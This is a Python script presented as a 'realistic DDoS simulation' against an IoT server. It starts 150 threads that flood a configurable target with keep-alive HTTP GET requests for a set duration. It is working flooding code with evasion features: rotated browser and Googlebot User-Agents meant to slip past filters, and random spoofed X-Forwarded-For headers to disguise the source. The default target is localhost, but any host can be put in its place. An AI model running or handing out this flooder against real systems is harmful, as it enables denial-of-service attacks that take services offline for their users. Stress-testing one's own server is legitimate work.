import socket
import threading
import random
import time

# --- CONFIGURATION ---
TARGET_IP = "127.0.0.1"  # Your IoT Server IP
TARGET_PORT = 8080       # Your IoT Server Port
THREADS = 150            # Number of botnet threads
ATTACK_DURATION = 60     # Duration in seconds

# Realistic User-Agents to bypass simple filters
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0"
]

def generate_payload():
    """Generates a realistic HTTP GET request with randomized headers."""
    target_host = f"Host: {TARGET_IP}\r\n"
    user_agent = f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
    
    # Spoofing the source IP in the application layer
    spoofed_ip = f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
    
    header = f"GET /?item={random.randint(1,1000)} HTTP/1.1\r\n" + target_host + user_agent + spoofed_ip + "Connection: keep-alive\r\n\r\n"
    
    return header.encode()

def bot_worker():
    """A single 'Bot' that opens a socket and floods the target."""
    end_time = time.time() + ATTACK_DURATION
    
    while time.time() < end_time:
        try:
            # Create a raw TCP socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((TARGET_IP, TARGET_PORT))
            
            # Send multiple requests per connection (Keep-Alive attack)
            for _ in range(50): 
                s.send(generate_payload())
            
            s.close()
        except:
            # If the server drops the connection, the bot just retries
            pass

def launch_attack():
    print(f"--- LAUNCHING REALISTIC DDOS SIMULATION ---")
    print(f"Target: {TARGET_IP}:{TARGET_PORT} | Bots: {THREADS}")
    
    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=bot_worker)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    print("\n--- SIMULATION FINISHED ---")

if __name__ == "__main__":
    launch_attack()